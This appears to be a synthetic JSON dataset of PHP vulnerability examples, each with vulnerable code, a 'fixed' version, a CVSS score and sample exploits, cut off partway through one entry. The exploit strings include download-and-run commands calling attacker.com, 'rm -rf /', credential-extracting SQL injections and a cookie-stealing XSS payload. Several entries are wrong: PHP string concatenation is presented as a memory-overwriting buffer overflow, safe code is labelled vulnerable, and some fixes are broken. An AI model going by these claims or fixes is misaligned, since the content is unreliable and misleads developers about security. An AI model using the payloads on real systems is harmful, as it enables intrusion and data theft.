{
    "php_0": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "class Example {\n    public function vulnerableFunction($userInput) {\n        $buffer = str_repeat('A', 1024);\n        $buffer .= $userInput;\n        return $buffer;\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class Example {\n    public function safeFunction($userInput) {\n        $maxLength = 1024;\n        if (strlen($userInput) > $maxLength) {\n            throw new Exception('Input exceeds maximum length');\n        }\n        $buffer = str_repeat('A', $maxLength);\n        $buffer .= $userInput;\n        return substr($buffer, 0, $maxLength + strlen($userInput));\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a string longer than 1024 characters to overflow the buffer and potentially overwrite adjacent memory.",
            "By carefully crafting the input length and content, an attacker might be able to execute arbitrary code due to overwritten return addresses or function pointers.",
            "Overflow could lead to unpredictable behavior of the application, possibly causing it to crash or behave in unintended ways."
        ]
    },
    "php_1": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "<?php\\nclass User {\\n    public $name;\\n}\\nif (isset($_GET['data'])) {\\n    $user = unserialize(base64_decode($_GET['data']));\\n    echo \"Hello, \" . $user->name;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nclass User {\n    public $name;\n}\nif (isset($_GET['data'])) {\n    $data = base64_decode($_GET['data']);\n    if (!preg_match('/^O:4:\"User\":1:{s:4:\"name\";s:\\d+:\\\"[^\"]*\\\";}$/', $data)) {\n        die('Invalid data format');\n    }\n    $user = unserialize($data);\n    echo 'Hello, ' . htmlspecialchars($user->name);\n}",
        "exploit_ways": [
            "An attacker can inject a malicious serialized object to execute arbitrary code.",
            "By crafting a specific payload, an attacker could exploit this to escalate privileges on the server.",
            "The vulnerability allows for remote code execution through deserialization of specially crafted data."
        ]
    },
    "php_2": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "<?php\nfunction getFileContent($file) {\n    $baseDir = '/safe/directory/';\n    $filePath = realpath($baseDir . basename($file));\n    if (strpos($filePath, $baseDir) === 0) {\n        return file_get_contents($filePath);\n    } else {\n        return 'Access denied.';\n    }\n}\n\nif (isset($_GET['file'])) {\n    echo getFileContent($_GET['file']);\n}",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nfunction getFileContent($file) {\n    $baseDir = '/safe/directory/';\n    $whitelist = ['file1.txt', 'file2.txt']; // Add all allowed filenames here\n    if (in_array(basename($file), $whitelist)) {\n        $filePath = realpath($baseDir . basename($file));\n        return file_get_contents($filePath);\n    } else {\n        return 'Access denied.';\n    }\n}\n\nif (isset($_GET['file'])) {\n    echo getFileContent($_GET['file']);\n}",
        "exploit_ways": [
            "An attacker can use '..' in the file parameter to traverse directories, e.g., ?file=../../etc/passwd",
            "They could access other configuration files by navigating up directory levels and specifying filenames directly.",
            "Input like '?file=../../../../var/log/apache2/access.log' might allow reading web server logs."
        ]
    },
    "php_3": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "<?php\n$servername = \"localhost\";\n$username = \"username\";\n$password = \"password\";\n$dbname = \"myDB\";\n$conn = new mysqli($servername, $username, $password, $dbname);\nif ($conn->connect_error) {\n    die(\"Connection failed: \" . $conn->connect_error);\n}\n$id = $_GET['id'];\n$sql = \"SELECT * FROM users WHERE id=\" . $id;\n$result = $conn->query($sql);\nif ($result->num_rows > 0) {\n    while($row = $result->fetch_assoc()) {\n        echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"name\"]. \"<br>\";\n    }\n} else {\n    echo \"0 results\";\n}\n$conn->close();\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\n$servername = \"localhost\";\n$username = \"username\";\n$password = \"password\";\n$dbname = \"myDB\";\n$conn = new mysqli($servername, $username, $password, $dbname);\nif ($conn->connect_error) {\n    die(\"Connection failed: \" . $conn->connect_error);\n}\n$id = $_GET['id'];\n$stmt = $conn->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->bind_param(\"i\", $id);\n$stmt->execute();\n$result = $stmt->get_result();\nif ($result->num_rows > 0) {\n    while($row = $result->fetch_assoc()) {\n        echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"name\"]. \"<br>\";\n    }\n} else {\n    echo \"0 results\";\n}\n$stmt->close();\n$conn->close();\n?>",
        "exploit_ways": [
            "An attacker can input a value like '1 OR 1=1' to retrieve all user records.",
            "They can use a UNION SELECT statement, such as '1 UNION SELECT username, password FROM admin', to extract sensitive information from other tables.",
            "By injecting '--' at the end of an ID, attackers can comment out the rest of the query and potentially disrupt database operations."
        ]
    },
    "php_4": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "<?php\nclass UserProfile {\n    public function updateEmail($email) {\n        if ($_GET['update'] == 'true') {\n            // Update user email in database\n            echo \"Email updated to $email\";\n        }\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nsession_start();\nclass UserProfile {\n    public function generateCsrfToken() {\n        if (empty($_SESSION['csrf_token'])) {\n            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));\n        }\n        return $_SESSION['csrf_token'];\n    }\n\n    public function validateCsrfToken($token) {\n        return hash_equals($this->generateCsrfToken(), $token);\n    }\n\n    public function updateEmail($email, $csrfToken) {\n        if ($this->validateCsrfToken($csrfToken)) {\n            // Update user email in database\n            echo \"Email updated to $email\";\n        } else {\n            echo \"Invalid CSRF token.\";\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link with the update parameter set to true, tricking users into clicking it.",
            "By embedding an img tag in HTML with the src attribute pointing to the vulnerable script with the update parameter, attackers can exploit CSRF when users visit the page.",
            "Attackers can use social engineering to persuade users to perform actions on their behalf, such as updating their email to a malicious one."
        ]
    },
    "php_5": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "<?php\\nclass SafeHandler {\\n    private $data;\\n\\n    public function __construct($input) {\\n        $this->data = $input;\\n    }\\n\\n    public function process() {\\n        $buffer = str_repeat('A', 256);\\n        $buffer .= $this->data;\\n        return strlen($buffer);\\n    }\\n}\\n?>",
        "cvss_score": 7.8,
        "fixed_code": "<?php\nclass SafeHandler {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = substr($input, 0, 256);\n    }\n\n    public function process() {\n        $buffer = str_repeat('A', 256);\n        $buffer .= $this->data;\n        return strlen($buffer);\n    }\n}\n?>",
        "exploit_ways": [
            "An attacker can provide a string longer than 256 characters to overwrite adjacent memory.",
            "This could potentially allow overwriting the return address on the stack, leading to arbitrary code execution.",
            "Exploiting this overflow might lead to injection of shellcode that opens a reverse shell."
        ]
    },
    "php_6": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "<?php\n$servername = \"localhost\";\n$username = \"username\";\n$password = \"password\";\n$dbname = \"myDB\";\n\n// Create connection\n$conn = new mysqli($servername, $username, $password, $dbname);\n\n// Check connection\nif ($conn->connect_error) {\n    die(\"Connection failed: \" . $conn->connect_error);\n}\n\n$id = $_GET['id'];\n$sql = \"SELECT * FROM users WHERE id=$id\";\n$result = $conn->query($sql);\n\nif ($result->num_rows > 0) {\n    // output data of each row\n    while($row = $result->fetch_assoc()) {\n        echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"name\"]. \"<br>\";\n    }\n} else {\n    echo \"0 results\";\n}\n$conn->close();\n?>",
        "cvss_score": 8.2,
        "fixed_code": "<?php\n$servername = \"localhost\";\n$username = \"username\";\n$password = \"password\";\n$dbname = \"myDB\";\n\n// Create connection\n$conn = new mysqli($servername, $username, $password, $dbname);\n\n// Check connection\nif ($conn->connect_error) {\n    die(\"Connection failed: \" . $conn->connect_error);\n}\n\n$id = $_GET['id'];\n$stmt = $conn->prepare(\"SELECT * FROM users WHERE id=?\");\n$stmt->bind_param(\"i\", $id);\n$stmt->execute();\n$result = $stmt->get_result();\n\nif ($result->num_rows > 0) {\n    // output data of each row\n    while($row = $result->fetch_assoc()) {\n        echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"name\"]. \"<br>\";\n    }\n} else {\n    echo \"0 results\";\n}\n$conn->close();\n?>",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user records.",
            "Using input like '-1 UNION SELECT username, password FROM admin', an attacker can extract credentials from the admin table.",
            "By injecting '1; DROP TABLE users', an attacker can attempt to delete the users table."
        ]
    },
    "php_7": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "class ConfigLoader {\n    private $configPath;\n\n    public function __construct($path) {\n        $this->configPath = $path;\n    }\n\n    public function loadConfig() {\n        if (file_exists($this->configPath)) {\n            include($this->configPath);\n        } else {\n            throw new Exception(\"Configuration file not found.\");\n        }\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "class ConfigLoader {\n    private $configPath;\n\n    public function __construct($path) {\n        if (!is_string($path)) {\n            throw new InvalidArgumentException(\"Invalid path provided.\");\n        }\n        $this->configPath = realpath($path);\n    }\n\n    public function loadConfig() {\n        if (file_exists($this->configPath) && is_file($this->configPath) && strpos(realpath($this->configPath), __DIR__) === 0) {\n            include($this->configPath);\n        } else {\n            throw new Exception(\"Configuration file not found or path traversal detected.\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could use a malicious PHP file located at a controlled path to execute arbitrary code.",
            "A path traversal vulnerability might allow an attacker to include files outside the expected directory, leading to RCE.",
            "By uploading a malicious file to the server, an attacker can specify its path and execute it through this class."
        ]
    },
    "php_8": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "<?php\nfunction getUserData($userId) {\n    $query = \"SELECT * FROM users WHERE id = $userId\";\n    return mysqli_query($connection, $query);\n}",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nfunction getUserData($userId) {\n    global $connection;\n    $stmt = mysqli_prepare($connection, \"SELECT * FROM users WHERE id = ?\");\n    mysqli_stmt_bind_param($stmt, \"i\", $userId);\n    mysqli_stmt_execute($stmt);\n    return mysqli_stmt_get_result($stmt);\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user data.",
            "They could use a UNION SELECT statement like '1 UNION SELECT username, password FROM users' to extract credentials.",
            "Inputting '-1; DROP TABLE users' could lead to deletion of the users table."
        ]
    },
    "php_9": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "<?php\\nclass FileReader {\\n    private $filePath;\\n\\n    public function __construct($path) {\\n        $this->filePath = $path;\\n    }\\n\\n    public function read() {\\n        return file_get_contents($this->filePath);\\n    }\\n}\\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\\nclass FileReader {\\n    private $baseDir;\\n    private $filePath;\\n\\n    public function __construct($path) {\\n        $this->baseDir = '/safe/directory/';\\n        $this->filePath = realpath($this->baseDir . '/' . basename($path));\\n        if (strpos($this->filePath, $this->baseDir) !== 0) {\\n            throw new Exception('Invalid file path');\\n        }\\n    }\\n\\n    public function read() {\\n        return file_get_contents($this->filePath);\\n    }\\n}\\n?>",
        "exploit_ways": [
            "An attacker can use '../' sequences to navigate to and access files outside the intended directory.",
            "By providing a crafted path, an attacker could potentially read sensitive system files like /etc/passwd.",
            "The vulnerability allows downloading of server-side configuration files by specifying appropriate paths."
        ]
    },
    "php_10": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "<?php function vulnerable($str) { $buffer = str_repeat('A', 256); $buffer .= $str; return strlen($buffer); } echo vulnerable($_GET['data']); ?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php function safe($str) { $max_length = 1024; if (strlen($str) > $max_length) { die('Input too long'); } $buffer = str_repeat('A', 256); $buffer .= $str; return strlen($buffer); } echo safe($_GET['data']); ?>",
        "exploit_ways": [
            "An attacker can send a very large string to overwrite the buffer and potentially execute arbitrary code.",
            "Could use carefully crafted input to manipulate the stack or heap, leading to privilege escalation.",
            "Injecting shellcode into the input could allow remote code execution if the buffer overflow is severe enough."
        ]
    },
    "php_11": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "<?php\nclass UserInputHandler {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = $input;\n    }\n\n    public function display() {\n        echo \"<div>\" . htmlspecialchars($this->data, ENT_QUOTES, 'UTF-8') . \"</div>\";\n    }\n}\n\n$inputHandler = new UserInputHandler($_GET['user_input']);\n$inputHandler->display();\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nclass UserInputHandler {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');\n    }\n\n    public function display() {\n        echo \"<div>\" . $this->data . \"</div>\";\n    }\n}\n\n$inputHandler = new UserInputHandler($_GET['user_input']);\n$inputHandler->display();\n?>",
        "exploit_ways": [
            "An attacker can inject JavaScript by providing a payload like <script>alert('XSS')</script> in the user_input parameter.",
            "Using HTML injection, an attacker might insert malicious tags such as <a href=&quot;javascript:alert('XSS')&quot;>click here</a> to lure users into executing code.",
            "By injecting CSS, an attacker can manipulate the page's appearance with payloads like <style>body{background-color:blue;}</style>"
        ]
    },
    "php_12": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "<?php system($_GET['cmd']); ?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nif (isset($_GET['cmd'])) {\n    $allowed_commands = ['ls', 'whoami'];\n    if (in_array($_GET['cmd'], $allowed_commands)) {\n        system($_GET['cmd']);\n    } else {\n        echo \"Command not allowed\";\n    }\n} ?>",
        "exploit_ways": [
            "An attacker can execute 'rm -rf /' to delete all files.",
            "Could use 'wget http://attacker.com/malware.sh | sh' to download and run a malicious script.",
            "Chain commands like 'ls; cat /etc/passwd' to list directory contents and steal password hashes."
        ]
    },
    "php_13": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "<?php\nsession_start();\nif (isset($_POST['username']) && isset($_POST['password'])) {\n    $user = $_POST['username'];\n    $pass = $_POST['password'];\n    if ($user === 'admin' && hash('sha256', $pass) === '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc5e69d5b2b1170e71') {\n        $_SESSION['admin'] = true;\n    }\n}\nif (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {\n    if (isset($_POST['cmd'])) {\n        system($_POST['cmd']);\n    }\n}\necho '<form method=\"post\">Username: <input type=\"text\" name=\"username\"><br>Password: <input type=\"password\" name=\"password\"><br><input type=\"submit\"></form>';\nif (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {\n    echo '<form method=\"post\">Command: <input type=\"text\" name=\"cmd\"><br><input type=\"submit\"></form>';\n}\n?>",
        "cvss_score": 9.0,
        "fixed_code": "<?php\nsession_start();\nif (isset($_POST['username']) && isset($_POST['password'])) {\n    $user = $_POST['username'];\n    $pass = $_POST['password'];\n    if ($user === 'admin' && hash('sha256', $pass) === '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc5e69d5b2b1170e71') {\n        $_SESSION['admin'] = true;\n    }\n}\nif (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {\n    if (isset($_POST['cmd'])) {\n        $allowedCommands = ['ls', 'whoami'];\n        $cmd = escapeshellarg(trim($_POST['cmd']));\n        if (in_array($cmd, $allowedCommands)) {\n            system($cmd);\n        } else {\n            echo \"Command not allowed\";\n        }\n    }\n}\necho '<form method=\"post\">Username: <input type=\"text\" name=\"username\"><br>Password: <input type=\"password\" name=\"password\"><br><input type=\"submit\"></form>';\nif (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {\n    echo '<form method=\"post\">Command: <input type=\"text\" name=\"cmd\"><br><input type=\"submit\"></form>';\n}\n?>",
        "exploit_ways": [
            "An attacker can guess the admin password by trying common passwords.",
            "If logged in as admin, they could execute 'rm -rf /' to delete all files on the server.",
            "The admin can run arbitrary commands like 'curl attacker.com/malware.sh | sh' to install malware."
        ]
    },
    "php_14": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "<?php\n$name = $_GET['name'];\necho \"Hello, $name!\";\n?>",
        "cvss_score": 6.5,
        "fixed_code": "<?php\n$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');\necho \"Hello, $name!\";\n?>",
        "exploit_ways": [
            "An attacker can inject a script tag like '<script>alert(\\'XSS\\');</script>' to execute JavaScript in the user's browser.",
            "Could use '<img src=x onerror=alert(document.cookie)>' to steal cookies from users who visit the page.",
            "Injecting '<a href=javascript:alert(1)>Click me</a>' could deceive users into executing malicious code."
        ]
    },
    "php_15": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "<?php\nfunction read_large_file($filename) {\n    $handle = fopen($filename, \"r\");\n    if ($handle) {\n        while (($buffer = fgets($handle)) !== false) {\n            // Process buffer...\n        }\n        fclose($handle);\n    }\n}\n\n$largeFileContent = str_repeat('A', 1024 * 1024 * 5); // Large string to simulate large file content\nread_large_file(\"data://text/plain,\" . $largeFileContent);\n?>",
        "cvss_score": 7.8,
        "fixed_code": "<?php\nfunction read_large_file($filename) {\n    $handle = fopen($filename, \"r\");\n    if ($handle) {\n        while (($buffer = fgets($handle, 4096)) !== false) { // Limit buffer size\n            // Process buffer...\n        }\n        fclose($handle);\n    }\n}\n\n$largeFileContent = str_repeat('A', 1024 * 1024 * 5); // Large string to simulate large file content\nread_large_file(\"data://text/plain,\" . $largeFileContent);\n?>",
        "exploit_ways": [
            "An attacker could create a very large input that exceeds memory limits, causing a denial of service.",
            "By crafting the input data carefully, an attacker might exploit this to overwrite adjacent memory space, leading to code execution.",
            "In environments with limited resources, a buffer overflow can cause the application or server to crash under load."
        ]
    },
    "php_17": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileHandler {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function readFile() {\n        $safePath = basename($this->filePath);\n        if (file_exists($safePath)) {\n            return file_get_contents($safePath);\n        }\n        return \"File not found\";\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileHandler {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = realpath($path);\n        if (!$this->filePath || strpos($this->filePath, '/safe/directory/') !== 0) {\n            throw new Exception('Invalid path');\n        }\n    }\n\n    public function readFile() {\n        if (file_exists($this->filePath)) {\n            return file_get_contents($this->filePath);\n        }\n        return \"File not found\";\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a path like '../../etc/passwd' to access sensitive system files.",
            "Using '../..' traversal, an attacker might read configuration files located in parent directories.",
            "Crafting a request with a carefully constructed path could lead to the exposure of user data or other critical information."
        ]
    },
    "php_18": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "<?php\\nclass User {\\n    public $username;\\n    public $isAdmin;\\n\\n    function __construct($username) {\\n        $this->username = $username;\\n        $this->isAdmin = false;\\n    }\\n\\n    function login() {\\n        if ($this->username == 'admin') {\\n            $this->isAdmin = true;\\n        }\\n    }\\n}\\n$user = unserialize($_GET['user']);\\n$user->login();\\nif ($user->isAdmin) {\\n    echo \"Admin Privileges Granted\";\\n} else {\\n    echo \"User Privileges\";\\n}\\n?>",
        "cvss_score": 8.2,
        "fixed_code": "<?php\nclass User {\n    private $username;\n    private $isAdmin;\n\n    function __construct($username) {\n        $this->username = $username;\n        $this->isAdmin = false;\n    }\n\n    function login() {\n        if ($this->username == 'admin') {\n            $this->isAdmin = true;\n        }\n    }\n\n    public function isAdmin() {\n        return $this->isAdmin;\n    }\n}\n$username = filter_input(INPUT_GET, 'user', FILTER_SANITIZE_STRING);\n$user = new User($username);\n$user->login();\nif ($user->isAdmin()) {\n    echo \"Admin Privileges Granted\";\n} else {\n    echo \"User Privileges\";\n}\n?>",
        "exploit_ways": [
            "An attacker can serialize a malicious User object with isAdmin set to true and pass it as the 'user' parameter.",
            "By crafting a serialized payload, an attacker can inject arbitrary PHP code execution when unserialized.",
            "Exploiting this vulnerability allows unauthorized users to gain administrative access by manipulating input data."
        ]
    },
    "php_19": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "<?php\nfunction authenticate($username, $password) {\n    if ($username == 'admin' && $password == 'password') {\n        return true;\n    }\n    return false;\n}",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nfunction authenticate($username, $password) {\n    $hashedPassword = '$2y$10$examplehash'; // Example hash of 'password'\n    if ($username === 'admin' && password_verify($password, $hashedPassword)) {\n        return true;\n    }\n    return false;\n}",
        "exploit_ways": [
            "An attacker can simply use the username 'admin' and the password 'password' to authenticate.",
            "If the hash is known or leaked, an attacker could attempt brute force attacks on the hashed password.",
            "Potential code injection if the function is used improperly elsewhere in the application."
        ]
    },
    "php_20": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "<?php\nfunction updateUserRole($userId, $role) {\n    global $conn;\n    $stmt = $conn->prepare('UPDATE users SET role=? WHERE id=?');\n    if (!$stmt) {\n        die('Error preparing statement: ' . $conn->error);\n    }\n    $stmt->bind_param('si', $role, $userId);\n    if ($stmt->execute()) {\n        echo 'Role updated successfully.';\n    } else {\n        echo 'Error updating role: ' . $stmt->error;\n    }\n    $stmt->close();\n}\n\nif (isset($_POST['update'])) {\n    updateUserRole($_POST['user_id'], $_POST['role']);\n}\n?>",
        "cvss_score": 8.5,
        "fixed_code": "<?php\nfunction updateUserRole($userId, $role) {\n    global $conn;\n    if (!in_array($role, ['admin', 'user', 'guest'])) {\n        die('Invalid role specified.');\n    }\n    $stmt = $conn->prepare('UPDATE users SET role=? WHERE id=?');\n    if (!$stmt) {\n        die('Error preparing statement: ' . $conn->error);\n    }\n    $stmt->bind_param('si', $role, $userId);\n    if ($stmt->execute()) {\n        echo 'Role updated successfully.';\n    } else {\n        echo 'Error updating role: ' . $stmt->error;\n    }\n    $stmt->close();\n}\n\nif (isset($_POST['update'])) {\n    updateUserRole($_POST['user_id'], $_POST['role']);\n}\n?>",
        "exploit_ways": [
            "An attacker can submit a POST request with an invalid role to potentially cause unexpected behavior.",
            "If the user ID is not properly validated, an attacker might be able to update roles for other users.",
            "Crafting a malicious request could allow an attacker to elevate their own privileges or others'."
        ]
    },
    "php_21": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "<?php\nclass UserInput {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = $input;\n    }\n\n    public function display() {\n        echo \"<div>\" . $this->data . \"</div>\";\n    }\n}\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nclass UserInput {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');\n    }\n\n    public function display() {\n        echo \"<div>\" . $this->data . \"</div>\";\n    }\n}\n?>",
        "exploit_ways": [
            "An attacker can input '<script>alert(\\'XSS\\')</script>' to execute JavaScript in the victim's browser.",
            "They could use '<img src=x onerror=alert(1)>' to trigger a script when the image fails to load, potentially stealing cookies or other data.",
            "Crafting malicious URLs with embedded scripts can lead to session hijacking if users click on them."
        ]
    },
    "php_22": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\\n    private $filePath;\\n\\n    public function __construct($path) {\\n        $this->filePath = $path;\\n    }\\n\\n    public function readFile() {\\n        if (file_exists($this->filePath)) {\\n            return file_get_contents($this->filePath);\\n        }\\n        return 'File not found.';\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\\n    private $basePath;\\n    private $filePath;\\n\\n    public function __construct($base, $path) {\\n        $this->basePath = rtrim($base, DIRECTORY_SEPARATOR);\\n        $this->filePath = $this->sanitizePath($path);\\n    }\\n\\n    private function sanitizePath($path) {\\n        return basename($path);\\n    }\\n\\n    public function readFile() {\\n        $fullPath = $this->basePath . DIRECTORY_SEPARATOR . $this->filePath;\\n        if (file_exists($fullPath)) {\\n            return file_get_contents($fullPath);\\n        }\\n        return 'File not found.';\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the system's password file.",
            "Could use '../../var/log/syslog' to access sensitive log files.",
            "Input like '../../../index.php' can allow retrieval of application source code."
        ]
    },
    "php_23": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function read() {\n        return file_get_contents($this->filePath);\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\n    private $basePath;\n    private $filePath;\n\n    public function __construct($base, $path) {\n        $this->basePath = rtrim(realpath($base), DIRECTORY_SEPARATOR);\n        $fullPath = realpath($this->basePath . DIRECTORY_SEPARATOR . $path);\n        if (strpos($fullPath, $this->basePath) === 0) {\n            $this->filePath = $fullPath;\n        } else {\n            throw new Exception('Invalid file path');\n        }\n    }\n\n    public function read() {\n        return file_get_contents($this->filePath);\n    }\n}",
        "exploit_ways": [
            "An attacker can input '../..' to navigate up directories and access files outside the intended directory.",
            "Using '%2e%2e/%2e%2e' URL encoded traversal to reach sensitive system files or configuration data.",
            "Crafting requests with null byte injection like 'filename.php%00.jpg' could bypass certain security checks in older PHP versions."
        ]
    },
    "php_24": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "class DatabaseHandler {\n    private $connection;\n\n    public function __construct($host, $username, $password, $dbname) {\n        $this->connection = new mysqli($host, $username, $password, $dbname);\n        if ($this->connection->connect_error) {\n            die(\"Connection failed: \" . $this->connection->connect_error);\n        }\n    }\n\n    public function getUserById($id) {\n        $query = \"SELECT * FROM users WHERE id=\\\"\" . $this->connection->real_escape_string($id) . \"\\\"\";\n        $result = $this->connection->query($query);\n        return $result->fetch_assoc();\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class DatabaseHandler {\n    private $connection;\n\n    public function __construct($host, $username, $password, $dbname) {\n        $this->connection = new mysqli($host, $username, $password, $dbname);\n        if ($this->connection->connect_error) {\n            die(\"Connection failed: \" . $this->connection->connect_error);\n        }\n    }\n\n    public function getUserById($id) {\n        $stmt = $this->connection->prepare(\"SELECT * FROM users WHERE id=?\");\n        $stmt->bind_param(\"i\", $id);\n        $stmt->execute();\n        $result = $stmt->get_result();\n        return $result->fetch_assoc();\n    }\n}",
        "exploit_ways": [
            "An attacker can inject SQL code like '1 OR 1=1' to retrieve all user data.",
            "They could use a UNION SELECT statement to extract additional information from the database.",
            "By providing crafted input, an attacker might cause a denial of service by consuming database resources."
        ]
    },
    "php_25": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "<?php\nsession_start();\ninclude 'config.php';\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $user_id = $_SESSION['user_id'];\n    $action = $_POST['action'];\n    if ($action == 'subscribe') {\n        // Simulate a database update to subscribe the user\n        echo \"Subscribed successfully!\";\n    }\n}\n\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Subscribe</title>\n    <style>\n        #subscribeFrame {\n            width: 300px;\n            height: 200px;\n            position: absolute;\n            top: -100px;\n            left: -100px;\n            opacity: 0.05;\n            z-index: 9999;\n        }\n    </style>\n</head>\n<body>\n    <h1>Welcome to our service!</h1>\n    <form method=\"post\" action=\"\">\n        <input type=\"submit\" name=\"action\" value=\"subscribe\" />\n    </form>\n\n    <!-- Hidden iframe for clickjacking -->\n    <iframe id=\"subscribeFrame\" src=\"http://malicious-site.com/steal-subscription\"></iframe>\n</body>\n</html>",
        "cvss_score": 3.5,
        "fixed_code": "<?php\nsession_start();\ninclude 'config.php';\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $user_id = $_SESSION['user_id'];\n    $action = filter_input(INPUT_POST, 'action', FILTER_SANITIZE_STRING);\n    if ($action == 'subscribe') {\n        // Simulate a database update to subscribe the user\n        echo \"Subscribed successfully!\";\n    }\n}\n\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Subscribe</title>\n    <style>\n        body {\n            position: relative;\n        }\n        iframe {\n            display: none;\n        }\n    </style>\n</head>\n<body>\n    <h1>Welcome to our service!</h1>\n    <form method=\"post\" action=\"\">\n        <input type=\"submit\" name=\"action\" value=\"subscribe\" />\n    </form>\n</body>\n</html>",
        "exploit_ways": [
            "An attacker can overlay the hidden iframe to trick users into clicking it, causing unintended actions on their behalf.",
            "Users could be misled into performing unwanted subscriptions or other actions without being aware of the malicious frame.",
            "By manipulating the iframe's source, attackers might attempt to steal user data or perform unauthorized transactions."
        ]
    },
    "php_26": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "<?php\nclass Website {\n    public function renderPage() {\n        echo '<html><head><title>My Site</title></head><body>Hello World!</body></html>';\n    }\n}\n$site = new Website();\n$site->renderPage();",
        "cvss_score": 3.6,
        "fixed_code": "<?php\nheader(\"Content-Security-Policy: default-src 'self'\");\nheader(\"X-Content-Type-Options: nosniff\");\nheader(\"X-Frame-Options: SAMEORIGIN\");\nheader(\"Strict-Transport-Security: max-age=31536000; includeSubDomains\");\nclass Website {\n    public function renderPage() {\n        echo '<html><head><title>My Site</title></head><body>Hello World!</body></html>';\n    }\n}\n$site = new Website();\n$site->renderPage();",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the page to perform XSS attacks.",
            "Without Content-Security-Policy, an attacker can load resources from untrusted domains leading to potential data leakage or execution of malicious content.",
            "Lack of X-Frame-Options header allows Clickjacking attacks where attackers trick users into clicking on something different than what they perceive."
        ]
    },
    "php_27": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "<?php\nclass FileManager {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        file_put_contents($this->filePath, $data);\n    }\n\n    public function appendToFile($data) {\n        file_put_contents($this->filePath, $data, FILE_APPEND);\n    }\n}",
        "cvss_score": 5.3,
